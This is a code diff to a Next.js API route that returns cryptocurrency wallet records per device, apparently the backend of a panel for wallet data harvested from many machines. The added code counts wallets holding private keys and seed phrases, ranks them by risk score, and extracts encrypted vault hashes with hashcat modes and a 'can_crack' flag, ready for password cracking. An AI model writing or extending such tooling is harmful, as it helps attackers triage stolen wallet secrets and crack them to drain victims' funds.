@@ -51,7 +51,9 @@ export async function GET(
         file_path,
         private_key IS NOT NULL as has_private_key,
         seed_phrase IS NOT NULL as has_seed_phrase,
+        mnemonic IS NOT NULL as has_mnemonic,
         public_key,
+        public_key_format,
         account_name,
         extension_id,
         derivation_path,
@@ -60,11 +62,18 @@ export async function GET(
         wallet_software,
         ledger_device_model,
         ledger_balance_usd,
-        ledger_operations_count
+        ledger_operations_count,
+        vault_data,
+        risk_level,
+        risk_score,
+        primary_category,
+        categories,
+        notes
        FROM crypto_wallets
        WHERE device_id = ?
        ORDER BY
          CASE WHEN wallet_type = 'hardware_wallet' THEN 0 ELSE 1 END,
+         risk_score DESC,
          seed_id DESC,
          address_index ASC,
          wallet_type,
@@ -132,10 +141,15 @@ export async function GET(
       total_wallets: wallets?.length || 0,
       unique_wallet_types: new Set(wallets?.map((w: any) => w.wallet_name)).size,
       wallets_with_keys: wallets?.filter((w: any) => w.has_private_key || w.has_seed_phrase).length || 0,
+      wallets_with_private_keys: wallets?.filter((w: any) => w.has_private_key).length || 0,
+      wallets_with_seeds: wallets?.filter((w: any) => w.has_seed_phrase || w.has_mnemonic).length || 0,
+      wallets_with_public_keys: wallets?.filter((w: any) => w.public_key).length || 0,
+      wallets_with_vault_data: wallets?.filter((w: any) => w.vault_data).length || 0,
       unique_blockchains: new Set(wallets?.filter((w: any) => w.blockchain).map((w: any) => w.blockchain)).size,
       total_crypto_history: cryptoHistory.length,
       total_crypto_sessions: cryptoSessions?.length || 0,
       total_crypto_software: cryptoSoftware?.length || 0,
+      high_risk_wallets: wallets?.filter((w: any) => w.risk_level === 'critical' || w.risk_level === 'high').length || 0,
       crypto_activity_score: calculateCryptoActivityScore({
         wallets: wallets?.length || 0,
         history: cryptoHistory.length,
@@ -203,6 +217,46 @@ export async function GET(
     // Group history by category
     const historyByCategory = groupBy(cryptoHistory, 'category')
 
+    // Extract vault hashes for hashcat
+    const vaultHashes = wallets
+      ?.filter((w: any) => w.vault_data)
+      .map((w: any) => {
+        try {
+          const vaultData = typeof w.vault_data === 'string' ? JSON.parse(w.vault_data) : w.vault_data
+          return {
+            wallet_name: w.wallet_name,
+            wallet_type: w.wallet_type,
+            blockchain: w.blockchain,
+            hash: vaultData.hash,
+            hashcat_mode: vaultData.hashcat_mode,
+            iterations: vaultData.iterations,
+            kdf: vaultData.kdf,
+            can_crack: vaultData.can_crack,
+            file_path: w.file_path
+          }
+        } catch (e) {
+          return null
+        }
+      })
+      .filter(Boolean) || []
+
+    // Extract public keys
+    const publicKeys = wallets
+      ?.filter((w: any) => w.public_key)
+      .map((w: any) => ({
+        wallet_name: w.wallet_name,
+        wallet_type: w.wallet_type,
+        blockchain: w.blockchain,
+        public_key: w.public_key,
+        public_key_format: w.public_key_format,
+        address: w.address,
+        derivation_path: w.derivation_path,
+        file_path: w.file_path
+      })) || []
+
+    // Group public keys by blockchain
+    const publicKeysByBlockchain = groupBy(publicKeys, 'blockchain')
+
     return NextResponse.json({
       success: true,
       device_id: deviceId,
@@ -222,6 +276,17 @@ export async function GET(
         stats: hdWalletStats
       },
       ledger_live: ledgerStats,
+      vault_hashes: {
+        all: vaultHashes,
+        count: vaultHashes.length,
+        by_wallet: groupBy(vaultHashes, 'wallet_name')
+      },
+      public_keys: {
+        all: publicKeys,
+        count: publicKeys.length,
+        by_blockchain: publicKeysByBlockchain,
+        by_format: groupBy(publicKeys.filter((pk: any) => pk.public_key_format), 'public_key_format')
+      },
       crypto_history: {
         all: cryptoHistory,
         by_category: historyByCategory,
